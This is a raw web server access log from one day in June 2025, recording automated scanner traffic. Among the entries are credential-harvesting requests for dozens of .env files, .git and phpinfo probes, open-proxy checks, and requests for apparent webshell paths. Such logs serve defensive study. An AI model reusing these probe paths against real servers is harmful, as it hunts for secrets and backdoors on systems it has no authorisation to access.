118.123.1.35 - - [21/Jun/2025:12:32:28 +0000] "GET /index.php HTTP/1.1" 500 6864 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
118.123.1.35 - - [21/Jun/2025:12:32:28 +0000] "GET /stylesheets/theme.css HTTP/1.1" 500 6864 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
118.123.1.35 - - [21/Jun/2025:12:32:28 +0000] "GET /customer/js/lang_zh_tw.js HTTP/1.1" 500 6864 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
118.123.1.35 - - [21/Jun/2025:12:32:28 +0000] "GET /chs/js/lang_zh_tw.js HTTP/1.1" 500 6864 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
118.123.1.35 - - [21/Jun/2025:12:32:28 +0000] "GET /index.php HTTP/1.1" 500 6870 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
118.123.1.35 - - [21/Jun/2025:12:32:28 +0000] "GET /login/stylesheets/theme.css HTTP/1.1" 500 6864 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
118.123.1.35 - - [21/Jun/2025:12:32:28 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
118.123.1.35 - - [21/Jun/2025:12:32:28 +0000] "GET /public/stylesheets/theme.css HTTP/1.1" 500 6870 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
199.204.97.58 - - [21/Jun/2025:12:42:13 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
59.82.21.107 - - [21/Jun/2025:12:43:15 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4631.155 Safari/537.36"
141.98.10.162 - - [21/Jun/2025:12:52:03 +0000] "GET / HTTP/1.1" 500 6870 "-" "-"
199.204.97.58 - - [21/Jun/2025:12:55:42 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
204.76.203.219 - - [21/Jun/2025:12:57:12 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
149.50.103.48 - - [21/Jun/2025:13:02:38 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
199.204.97.58 - - [21/Jun/2025:13:09:12 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
89.248.164.165 - - [21/Jun/2025:13:09:14 +0000] "GET http://pingjs.qq.com/ping.js HTTP/1.1" 500 6864 "-" "Mozilla"
176.65.148.75 - - [21/Jun/2025:13:17:31 +0000] "GET / HTTP/1.1" 500 6864 "-" "-"
199.204.97.58 - - [21/Jun/2025:13:22:43 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
204.76.203.219 - - [21/Jun/2025:13:27:13 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
167.94.145.110 - - [21/Jun/2025:13:28:38 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.110 - - [21/Jun/2025:13:28:40 +0000] "PRI * HTTP/2.0" 400 157 "-" "-"
167.94.145.110 - - [21/Jun/2025:13:28:44 +0000] "GET /favicon.ico HTTP/1.1" 200 1150 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.110 - - [21/Jun/2025:13:28:45 +0000] "PRI * HTTP/2.0" 400 157 "-" "-"
167.94.145.110 - - [21/Jun/2025:13:28:49 +0000] "GET /sitemap.xml HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.110 - - [21/Jun/2025:13:28:54 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03B\xE9m\x12\xD3>:\x133wd\x8B\xD9!\xF9\x06\xEE\xFB/O\xF8w\xED\xF36\xB2iQv\x1F\xF8\xB7 ^\x80R\xC64\xEC\xF9b%t&[\xA9e\xA2j\xDE5\xE1\xD3q\xC5Z\xE9\x95\xBE\x05Y\xED\xD1g\x9B\x00&\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
199.204.97.58 - - [21/Jun/2025:13:36:12 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
164.52.24.179 - - [21/Jun/2025:13:43:19 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\xFF;\x90A2]\x810S]2" 400 157 "-" "-"
164.52.24.179 - - [21/Jun/2025:13:43:21 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
164.52.24.179 - - [21/Jun/2025:13:43:24 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
164.52.24.179 - - [21/Jun/2025:13:43:28 +0000] "GET / HTTP/1.1" 500 6870 "-" "-"
164.52.24.179 - - [21/Jun/2025:13:43:32 +0000] "GET /favicon.ico HTTP/1.1" 200 1150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
199.204.97.58 - - [21/Jun/2025:13:49:43 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
5.183.209.244 - - [21/Jun/2025:13:57:51 +0000] "GET / HTTP/1.1" 500 6870 "-" "-"
199.204.97.58 - - [21/Jun/2025:14:03:17 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
149.50.103.48 - - [21/Jun/2025:14:03:28 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
204.76.203.219 - - [21/Jun/2025:14:04:18 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
204.76.203.219 - - [21/Jun/2025:14:09:13 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
199.204.97.58 - - [21/Jun/2025:14:16:43 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
89.42.231.140 - - [21/Jun/2025:14:28:45 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
199.204.97.58 - - [21/Jun/2025:14:30:13 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
43.157.179.227 - - [21/Jun/2025:14:32:18 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
196.251.70.216 - - [21/Jun/2025:14:42:34 +0000] "GET /.env HTTP/1.1" 500 6870 "-" "SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0"
204.76.203.219 - - [21/Jun/2025:14:42:36 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
199.204.97.58 - - [21/Jun/2025:14:43:43 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
199.204.97.58 - - [21/Jun/2025:14:57:12 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
123.181.26.3 - - [21/Jun/2025:15:05:04 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
123.181.26.3 - - [21/Jun/2025:15:05:04 +0000] "GET /favicon.ico HTTP/1.1" 200 1150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
199.204.97.58 - - [21/Jun/2025:15:10:43 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
149.50.103.48 - - [21/Jun/2025:15:15:44 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
204.76.203.219 - - [21/Jun/2025:15:17:49 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
78.153.140.151 - - [21/Jun/2025:15:19:28 +0000] "GET /.env HTTP/1.1" 500 6870 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98) Opera 7.20  [en]"
78.153.140.151 - - [21/Jun/2025:15:19:28 +0000] "\x16\x03\x01\x00\xAC\x01\x00\x00\xA8\x03\x03(P\xD8\xDDM\xDE\xFE]:\xBA\x8D?\x9FF\x9A\x85\xCB\xB1o\x00\x1B\xDC\xE7\xA4W\xD9\xB7!\xAD*\xE93\x00\x008\xC0,\xC0" 400 157 "-" "-"
78.153.140.151 - - [21/Jun/2025:15:19:28 +0000] "GET /twilio.env HTTP/1.1" 500 6864 "-" "Opera/9.52 (X11; Linux ppc; U; de)"
78.153.140.151 - - [21/Jun/2025:15:19:29 +0000] "GET /aws.env HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.8.0.1) Gecko/20060313 Fedora/1.5.0.1-9 Firefox/1.5.0.1 pango-text Mnenhy/0.7.3.0"
78.153.140.151 - - [21/Jun/2025:15:19:29 +0000] "GET /conf.env HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8"
78.153.140.151 - - [21/Jun/2025:15:19:30 +0000] "GET /ses.env HTTP/1.1" 500 6864 "-" "Opera/7.11 (Windows NT 5.1; U)  [en]"
78.153.140.151 - - [21/Jun/2025:15:19:31 +0000] "GET /api/.env HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.213.1 Safari/532.1"
78.153.140.151 - - [21/Jun/2025:15:19:32 +0000] "GET /backend/.env HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Linux; Android 5.1.1; Coolpad 3623A Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36"
78.153.140.151 - - [21/Jun/2025:15:19:33 +0000] "GET /admin/.env HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Firefox/2.0.0.1"
78.153.140.151 - - [21/Jun/2025:15:19:34 +0000] "GET /.env.example HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b2) Gecko/2007121016 Firefox/3.0b2"
78.153.140.151 - - [21/Jun/2025:15:19:35 +0000] "GET /app_dev.php/_profiler/phpinfo HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 6.0; rv:43.0) Gecko/20100101 Firefox/43.0"
78.153.140.151 - - [21/Jun/2025:15:19:35 +0000] "GET /?phpinfo=-1 HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-J327T1 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.2 Chrome/51.0.2704.106 Mobile Safari/537.36"
78.153.140.151 - - [21/Jun/2025:15:19:36 +0000] "GET /stats/.env HTTP/1.1" 500 6870 "-" "Opera/9.51 (Windows NT 6.0; U; sv)"
78.153.140.151 - - [21/Jun/2025:15:19:37 +0000] "GET /tmp/.env HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.0.14) Gecko/2009090216 Ubuntu/9.04 (jaunty) Firefox/3.0.14"
78.153.140.151 - - [21/Jun/2025:15:19:38 +0000] "GET /htdocs/.env HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G610F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
78.153.140.151 - - [21/Jun/2025:15:19:38 +0000] "GET /facturacion/.env HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)"
78.153.140.151 - - [21/Jun/2025:15:19:39 +0000] "GET /local.env HTTP/1.1" 500 6864 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; BRI/1)"
78.153.140.151 - - [21/Jun/2025:15:19:39 +0000] "GET /videos/.env HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991"
78.153.140.151 - - [21/Jun/2025:15:19:40 +0000] "GET /example.env HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (iPod; CPU iPhone OS 6_1_3 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B329 Safari/8536.25"
78.153.140.151 - - [21/Jun/2025:15:19:40 +0000] "GET /horde/.env HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/11.0 Safari/603.1.50"
78.153.140.151 - - [21/Jun/2025:15:19:41 +0000] "GET /fileserver/.env HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; HTC_0PCV220/1.10.506.1 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
78.153.140.151 - - [21/Jun/2025:15:19:41 +0000] "GET /.env.swp HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.32 (KHTML, like Gecko) Version/10.0 Safari/602.1.32"
78.153.140.151 - - [21/Jun/2025:15:19:43 +0000] "GET /root/.env HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Linux; U; Android 2.3.6; en-au; GT-S7500T Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
78.153.140.151 - - [21/Jun/2025:15:19:43 +0000] "GET /logging/.env HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; DROID RAZR Build/9.8.2O-72_VZW-16) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
78.153.140.151 - - [21/Jun/2025:15:19:44 +0000] "GET /rest/.env HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"
78.153.140.151 - - [21/Jun/2025:15:19:45 +0000] "GET /phpinfos.php HTTP/1.1" 404 27 "-" "Opera/9.80 (Macintosh; Intel Mac OS X 10.14.1) Presto/2.12.388 Version/12.16"
78.153.140.151 - - [21/Jun/2025:15:19:46 +0000] "GET /.env.development.local HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
78.153.140.151 - - [21/Jun/2025:15:19:47 +0000] "GET /http/.env HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; ar) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4"
78.153.140.151 - - [21/Jun/2025:15:19:47 +0000] "GET /sessions/.env HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.2 (KHTML, like Gecko) Version/11.0 Mobile/15D5046b Safari/604.1"
78.153.140.151 - - [21/Jun/2025:15:19:48 +0000] "GET /example/.env HTTP/1.1" 500 6864 "-" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
78.153.140.151 - - [21/Jun/2025:15:19:49 +0000] "GET /logon.env HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7"
78.153.140.151 - - [21/Jun/2025:15:19:50 +0000] "GET /m/.env HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Linux; U; Android 4.3; fr-fr; GT-I9300 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
78.153.140.151 - - [21/Jun/2025:15:19:50 +0000] "GET /static/.env HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:36.0) Gecko/20100101 Firefox/36.0"
78.153.140.151 - - [21/Jun/2025:15:20:13 +0000] "GET /.env.dev HTTP/1.1" 500 6864 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; Win64; x64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.3)"
78.153.140.151 - - [21/Jun/2025:15:20:17 +0000] "GET /user/.env HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900V Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
199.204.97.58 - - [21/Jun/2025:15:24:14 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
2.187.11.208 - - [21/Jun/2025:15:32:26 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
199.204.97.58 - - [21/Jun/2025:15:37:42 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
196.251.70.87 - - [21/Jun/2025:15:48:11 +0000] "GET /.git/HEAD HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:20.0) Gecko/20100101 Firefox/20.0"
199.204.97.58 - - [21/Jun/2025:15:51:13 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
204.76.203.219 - - [21/Jun/2025:15:52:19 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
204.76.203.219 - - [21/Jun/2025:15:58:51 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
187.103.7.77 - - [21/Jun/2025:16:03:43 +0000] "GET / HTTP/1.1" 500 6864 "-" "Hello-World/1.0"
187.103.7.77 - - [21/Jun/2025:16:03:44 +0000] "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 157 "-" "-"
199.204.97.58 - - [21/Jun/2025:16:04:42 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
87.121.84.208 - - [21/Jun/2025:16:06:31 +0000] "CNXN\x00\x00\x00\x01\x00\x00\x04\x00\x1B\x00\x00\x00M" 400 157 "-" "-"
167.172.92.212 - - [21/Jun/2025:16:11:22 +0000] "GET /geoip/ HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.172.92.212 - - [21/Jun/2025:16:11:22 +0000] "GET /favicon.ico HTTP/1.1" 200 1150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.172.92.212 - - [21/Jun/2025:16:11:23 +0000] "GET /systembc/password.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.172.92.212 - - [21/Jun/2025:16:11:24 +0000] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03\xAB{\xF1=u)\xA3I\xCD\xE7\xB9\xDBv\xBE\xCA\x8B3ZN\xDF" 400 157 "-" "-"
167.172.92.212 - - [21/Jun/2025:16:11:24 +0000] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03by\x07v\x80\x80%\xE1\x1E\x9D\xD9\xE6\xD8\xCC\x0Ca\xA9\xFA&\x0Cc\x92N]\xC3\xF0\xAFUh\x83p*\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
167.172.92.212 - - [21/Jun/2025:16:11:25 +0000] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03u\xD1&\xB5\xB6?P\x5C\xE6&\x1C\xBB\xA9\x15b\x08IV\xEE" 400 157 "-" "-"
167.172.92.212 - - [21/Jun/2025:16:11:25 +0000] "GET /form.html HTTP/1.1" 500 6864 "-" "curl/8.1.2"
167.172.92.212 - - [21/Jun/2025:16:11:26 +0000] "GET /password.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.172.92.212 - - [21/Jun/2025:16:11:27 +0000] "GET /upl.php HTTP/1.1" 404 27 "-" "Mozilla/5.0"
167.172.92.212 - - [21/Jun/2025:16:11:28 +0000] "GET /t4 HTTP/1.1" 500 6864 "-" "Mozilla/5.0"
167.172.92.212 - - [21/Jun/2025:16:11:28 +0000] "GET /1.php HTTP/1.1" 404 27 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
149.50.103.48 - - [21/Jun/2025:16:16:26 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
199.204.97.58 - - [21/Jun/2025:16:18:13 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
101.142.226.32 - - [21/Jun/2025:16:27:27 +0000] "GET / HTTP/1.1" 500 6864 "-" "Hello-World/1.0"
101.142.226.32 - - [21/Jun/2025:16:27:27 +0000] "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 157 "-" "-"
93.174.93.12 - - [21/Jun/2025:16:28:10 +0000] "GET / HTTP/1.0" 500 6851 "-" "Mozilla/5.0 (X11; Linux i686 (x86_64)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3187.0 Safari/537.366"
80.82.77.202 - - [21/Jun/2025:16:29:56 +0000] "GET / HTTP/1.0" 500 6851 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
199.204.97.58 - - [21/Jun/2025:16:31:41 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
204.76.203.219 - - [21/Jun/2025:16:38:59 +0000] "GET / HTTP/1.1" 500 6870 "-" "curl/7.81.0"
5.183.209.244 - - [21/Jun/2025:16:44:21 +0000] "GET / HTTP/1.1" 500 6870 "-" "-"
199.204.97.58 - - [21/Jun/2025:16:45:12 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
199.204.97.58 - - [21/Jun/2025:16:58:43 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
204.76.203.219 - - [21/Jun/2025:17:07:13 +0000] "GET / HTTP/1.1" 500 6864 "-" "curl/7.81.0"
199.204.97.58 - - [21/Jun/2025:17:12:13 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6870 "-" "Go-http-client/1.1"
149.50.103.48 - - [21/Jun/2025:17:17:32 +0000] "GET / HTTP/1.1" 500 6870 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
199.204.97.58 - - [21/Jun/2025:17:25:42 +0000] "GET http://httpbin.org/get HTTP/1.1" 500 6864 "-" "Go-http-client/1.1"
87.236.176.100 - - [21/Jun/2025:17:38:31 +0000] "GET / HTTP/1.1" 500 6864 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
